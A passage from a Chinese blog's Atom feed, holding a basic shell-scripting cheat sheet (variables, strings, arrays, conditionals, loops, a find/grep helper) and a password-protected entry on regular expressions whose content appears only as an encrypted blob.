    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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